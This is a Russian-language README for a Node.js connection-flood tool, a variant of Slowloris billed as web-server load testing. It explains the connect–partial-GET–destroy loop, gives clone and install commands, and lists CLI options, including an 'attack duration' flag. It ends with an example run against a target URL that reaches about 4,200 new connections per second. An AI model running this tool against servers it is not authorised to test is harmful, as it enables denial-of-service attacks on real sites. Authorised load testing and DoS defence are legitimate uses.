![slow loris picture](https://upload.wikimedia.org/wikipedia/commons/b/b8/Slowloris_DDOS.png)

## Slowloris — Connection Burst

Node.js инструмент для нагрузочного тестирования веб-серверов через максимальную скорость создания новых TCP-соединений из нескольких параллельных OS-процессов.

## Принцип работы

Цель не удержание соединений (классический slowloris), а **всплеск скорости их создания**:

```
connect → частичный GET-запрос → destroy → немедленно повторить
```

Каждый воркер держит `-s` параллельных in-flight попыток подключения. Как только одна завершается — стартует новая. `-i` воркеров запускаются как отдельные OS-процессы через `child_process.fork()`, каждый со своей таблицей файловых дескрипторов и своим `ulimit -n`.

Итог: `instances × concurrent_rate` новых TCP-соединений в секунду.

## Установка

```bash
git clone https://github.com/AndriiMSN/slowattack_bash.git
npm install --prefix slowattack_bash/vendor-slowloris
```

## Использование

```
node vendor-slowloris/lib/index.js [options] <url>

Options:
  -V, --version        output the version number
  -p, --port <n>       порт веб-сервера (default: 80)
  -s, --sockets <n>    параллельных попыток подключения на воркер (default: 200)
  -i, --instances <n>  число параллельных OS-процессов воркеров (default: 20)
  -t, --time <n>       длительность атаки в миллисекундах
  -h, --help           output usage information
```

## Пример

```bash
# 20 процессов × 200 параллельных попыток — максимальный burst
node vendor-slowloris/lib/index.js -p 80 -s 200 -i 20 http://target.sslip.io
```

Вывод во время работы:
```
↓ Bursting 4200 conn/s | workers: 20 | total: 84000
```

## Лицензия

[MIT License](https://opensource.org/licenses/MIT)
